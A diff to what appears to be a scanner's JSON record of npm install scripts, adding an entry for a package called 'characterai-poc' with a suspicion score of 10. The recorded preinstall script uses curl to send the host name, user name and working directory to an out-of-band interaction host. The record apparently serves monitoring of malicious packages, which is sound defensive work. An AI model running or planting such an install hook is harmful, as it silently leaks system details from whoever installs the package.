@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "characterai-poc",
+    "version": "1.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "curl --data-urlencode \"info=$(hostname && whoami && pwd)\" http://7ddb2b753341353f11f9guptg9wyyyyyb.oast.pro",
+    "previousVersion": null,
+    "timestamp": "2026-03-21T14:34:52.906Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
     "packageName": "@leohenon/ocv",
     "version": "1.2.27-vim.2.6",
     "scriptType": "postinstall",
